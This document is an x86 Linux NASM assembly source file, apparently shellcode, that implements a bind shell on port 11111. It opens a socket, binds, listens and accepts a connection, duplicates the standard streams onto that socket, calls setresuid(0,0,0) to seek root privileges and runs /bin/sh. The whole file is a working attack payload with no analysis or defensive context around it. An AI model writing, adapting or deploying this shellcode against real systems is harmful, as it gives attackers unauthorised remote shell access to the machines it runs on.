
;Filename - Bind_shell3.nasm

global _start 

section .text 

_start:

;socket(2,1,6)
push 0x6
push 0x1
push 0x2

xor ebx, ebx
mov bl , 0x1 

xor ecx, ecx
mov ecx, esp 

xor eax, eax
mov al, 0x66 ; system call number for socket 
int 0x80
mov esi, eax


xor ebx,ebx
push ebx
push word 0x672B ; port is configured here 
push word 0x2
mov ecx, esp
push 0x10
push ecx
push esi 
mov bl, 0x2
mov ecx, esp

xor eax, eax
mov al, 0x66  
int 0x80

;listen(int sockfd, 1)

push 0x1 
push esi 
xor ebx, ebx
mov bl, 0x4
mov ecx, esp 

xor eax, eax 
mov al, 0x66 
int 0x80 

;accept(int sockfd,NULL,NULL)

xor ebx, ebx 
push ebx
push ebx
push esi 
mov bl, 0x5
mov ecx, esp

xor eax, eax
mov al, 0x66
int 0x80
mov ebx, eax 

push byte 2 
pop ecx
loop4dup:
push byte 63
pop eax
int 0x80
dec ecx
jns loop4dup


;setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80


;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80

